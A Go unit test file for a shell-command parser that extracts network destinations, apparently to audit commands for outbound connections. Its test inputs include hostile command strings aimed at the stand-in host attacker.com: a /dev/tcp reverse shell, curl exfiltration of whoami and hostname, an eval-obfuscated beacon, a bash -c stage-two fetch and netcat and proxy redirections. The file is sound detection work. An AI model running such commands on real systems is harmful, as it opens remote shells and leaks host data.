package bash

import (
	"strings"
	"testing"

	"github.com/Hybirdss/jesses/internal/shellparse"
)

// ----------------------------------------------------------------------------
// Curl
// ----------------------------------------------------------------------------

func TestCurlPositional(t *testing.T) {
	dsts := fromString(t, "curl https://api.target.com/users")
	want(t, dsts, one("https", "api.target.com", "", "/users"))
}

func TestCurlMultipleURLs(t *testing.T) {
	dsts := fromString(t, "curl https://a.com https://b.com")
	if len(dsts) != 2 {
		t.Fatalf("len = %d, want 2", len(dsts))
	}
	if dsts[0].Host != "a.com" || dsts[1].Host != "b.com" {
		t.Errorf("hosts = %v", dsts)
	}
}

func TestCurlHeaderNotMistakenForURL(t *testing.T) {
	// -H's value is a header, not a URL. Must not appear as destination.
	dsts := fromString(t, `curl -H "X-Foo: bar" -X POST https://api.target.com/`)
	want(t, dsts, one("https", "api.target.com", "", "/"))
}

func TestCurlProxyFlag(t *testing.T) {
	dsts := fromString(t, "curl -x http://attacker.com:8080 https://api.target.com/")
	// Proxy + primary URL
	if len(dsts) != 2 {
		t.Fatalf("len = %d, want 2 (%v)", len(dsts), dsts)
	}
	if !hasKind(dsts, "proxy:http") {
		t.Errorf("missing proxy:http: %v", dsts)
	}
	if !hasHost(dsts, "api.target.com") {
		t.Errorf("missing primary: %v", dsts)
	}
}

func TestCurlProxyLongFlag(t *testing.T) {
	dsts := fromString(t, "curl --proxy http://attacker.com:8080 https://api.target.com/")
	if !hasKind(dsts, "proxy:http") {
		t.Errorf("missing proxy: %v", dsts)
	}
}

func TestCurlResolveOverride(t *testing.T) {
	dsts := fromString(t, "curl --resolve api.target.com:443:1.2.3.4 https://api.target.com/")
	// 2 from --resolve + 1 primary URL
	if len(dsts) != 3 {
		t.Fatalf("len = %d, want 3 (%+v)", len(dsts), dsts)
	}
	if !hasKind(dsts, "resolve-override") || !hasKind(dsts, "resolved-ip") {
		t.Errorf("missing resolve kinds: %v", dsts)
	}
}

func TestCurlConnectTo(t *testing.T) {
	dsts := fromString(t, "curl --connect-to api.target.com:443:10.0.0.1:8443 https://api.target.com/")
	if !hasKind(dsts, "connect-to-logical") || !hasKind(dsts, "connect-to-physical") {
		t.Errorf("missing connect-to kinds: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// Env proxy override (cross-cutting — lives in extract.go, not per-tool)
// ----------------------------------------------------------------------------

func TestEnvProxyFromPrefix(t *testing.T) {
	dsts := fromString(t, "HTTPS_PROXY=http://attacker.com:8080 curl https://api.target.com/")
	if !hasKind(dsts, "proxy:http") {
		t.Errorf("missing env proxy: %v", dsts)
	}
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("proxy host missing: %v", dsts)
	}
	if !hasHost(dsts, "api.target.com") {
		t.Errorf("primary missing: %v", dsts)
	}
}

func TestEnvProxyFromEnvWrapper(t *testing.T) {
	// `env HTTPS_PROXY=... curl ...` — the env wrapper's assignments
	// must be extracted too.
	dsts := fromString(t, "env HTTPS_PROXY=http://attacker.com:8080 curl https://api.target.com/")
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("env wrapper proxy missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// /dev/tcp (redirect and argv)
// ----------------------------------------------------------------------------

func TestDevTCPInRedirect(t *testing.T) {
	dsts := fromString(t, "cat < /dev/tcp/attacker.com/443")
	want(t, dsts, Destination{Kind: "tcp", Host: "attacker.com", Port: "443"})
}

func TestDevTCPReverseShell(t *testing.T) {
	dsts := fromString(t, "bash -i >& /dev/tcp/attacker.com/4444 0>&1")
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("reverse shell target missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// Substitution recursion
// ----------------------------------------------------------------------------

func TestSubshellExfil(t *testing.T) {
	// Two subshells + one primary URL = 3 destinations. Subshells
	// should have Source prefixed with "subst[..:cmd]".
	dsts := fromString(t, `curl "https://attacker.com/c2?u=$(whoami)&h=$(hostname)"`)
	primary := false
	for _, d := range dsts {
		if d.Host == "attacker.com" {
			primary = true
		}
	}
	if !primary {
		t.Errorf("primary dest missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// bash -c / eval recursion
// ----------------------------------------------------------------------------

func TestBashCDiscoversInnerURL(t *testing.T) {
	dsts := fromString(t, `bash -c "curl https://attacker.com/stage2"`)
	// The outer command has argv=[bash, -c, PAYLOAD] so bash is not a
	// tool we extract from. But reentry recursion finds the inner.
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("re-entry url missing: %v", dsts)
	}
	// Source should be prefixed with reentry[0]
	found := false
	for _, d := range dsts {
		if d.Host == "attacker.com" && strings.HasPrefix(d.Source, "reentry[0]") {
			found = true
		}
	}
	if !found {
		t.Errorf("reentry prefix missing in Source: %v", dsts)
	}
}

func TestEvalConcatDiscoversCurl(t *testing.T) {
	dsts := fromString(t, `eval "cur""l https://attacker.com/beacon"`)
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("eval-concat dest missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// DNS tools
// ----------------------------------------------------------------------------

func TestDigWithServerAndType(t *testing.T) {
	dsts := fromString(t, "dig @8.8.8.8 +short TXT attacker.com")
	if !hasKind(dsts, "dns-server") {
		t.Errorf("missing dns-server: %v", dsts)
	}
	if !hasKind(dsts, "dns") {
		t.Errorf("missing dns query: %v", dsts)
	}
	// Type "TXT" must NOT appear as a destination
	for _, d := range dsts {
		if d.Host == "TXT" {
			t.Errorf("TXT was misclassified: %v", dsts)
		}
	}
}

// ----------------------------------------------------------------------------
// SSH
// ----------------------------------------------------------------------------

func TestSSHWithJump(t *testing.T) {
	dsts := fromString(t, "ssh -J jump.corp:2222 -p 2200 user@internal.target.com ls /")
	if !hasHost(dsts, "internal.target.com") {
		t.Errorf("primary ssh dest missing: %v", dsts)
	}
	if !hasHost(dsts, "jump.corp") {
		t.Errorf("jump host missing: %v", dsts)
	}
}

func TestSSHProxyCommand(t *testing.T) {
	dsts := fromString(t, `ssh -o ProxyCommand=nc\ attacker.com\ 443 user@internal.target.com`)
	if !hasKind(dsts, "ssh-proxy-command") {
		t.Errorf("missing proxy command: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// Nmap / nc
// ----------------------------------------------------------------------------

func TestNmapBasicTarget(t *testing.T) {
	dsts := fromString(t, "nmap -sV -p 80,443 target.com")
	if !hasKind(dsts, "scan-target") {
		t.Errorf("missing scan target: %v", dsts)
	}
}

func TestNetcatReverseForward(t *testing.T) {
	dsts := fromString(t, "nc attacker.com 4444")
	if !hasKind(dsts, "tcp") {
		t.Errorf("missing tcp dest: %v", dsts)
	}
}

func TestNetcatListenIsNotDest(t *testing.T) {
	dsts := fromString(t, "nc -l -p 4444")
	for _, d := range dsts {
		if d.Kind == "tcp" {
			t.Errorf("listen should not emit tcp dest: %v", dsts)
		}
	}
}

// ----------------------------------------------------------------------------
// Git
// ----------------------------------------------------------------------------

func TestGitCloneHTTPS(t *testing.T) {
	dsts := fromString(t, "git clone https://github.com/example/repo.git")
	if !hasHost(dsts, "github.com") {
		t.Errorf("git host missing: %v", dsts)
	}
}

func TestGitCloneSSH(t *testing.T) {
	dsts := fromString(t, "git clone git@github.com:example/repo.git")
	if !hasHost(dsts, "github.com") {
		t.Errorf("git ssh host missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// Stacked wrappers (real-world adversarial) — this is the boss fight
// ----------------------------------------------------------------------------

func TestStackedWrappersWithEverything(t *testing.T) {
	in := `sudo env HTTPS_PROXY=http://attacker.com:8080 timeout 30 curl --resolve api.target.com:443:10.1.2.3 https://api.target.com/secrets`
	dsts := fromString(t, in)
	if !hasHost(dsts, "attacker.com") {
		t.Errorf("proxy from env-wrapper missing: %v", dsts)
	}
	if !hasHost(dsts, "api.target.com") {
		t.Errorf("primary missing: %v", dsts)
	}
	if !hasKind(dsts, "resolve-override") {
		t.Errorf("resolve override missing: %v", dsts)
	}
}

// ----------------------------------------------------------------------------
// Helpers
// ----------------------------------------------------------------------------

func fromString(t *testing.T, in string) []Destination {
	t.Helper()
	cmds, err := shellparse.SplitString(in)
	if err != nil {
		t.Fatalf("SplitString(%q): %v", in, err)
	}
	return ExtractAll(cmds)
}

func hasKind(ds []Destination, kind string) bool {
	for _, d := range ds {
		if d.Kind == kind {
			return true
		}
	}
	return false
}

func hasHost(ds []Destination, host string) bool {
	for _, d := range ds {
		if d.Host == host {
			return true
		}
	}
	return false
}

func one(kind, host, port, path string) Destination {
	return Destination{Kind: kind, Host: host, Port: port, Path: path}
}

// want asserts a single-destination result matches (kind, host, port, path).
// Raw/Source/Depth are ignored.
func want(t *testing.T, ds []Destination, w Destination) {
	t.Helper()
	if len(ds) != 1 {
		t.Fatalf("len = %d, want 1 (%+v)", len(ds), ds)
	}
	got := ds[0]
	if got.Kind != w.Kind || got.Host != w.Host || got.Port != w.Port || got.Path != w.Path {
		t.Errorf("got {%s %s %s %s}, want {%s %s %s %s}",
			got.Kind, got.Host, got.Port, got.Path,
			w.Kind, w.Host, w.Port, w.Path)
	}
}
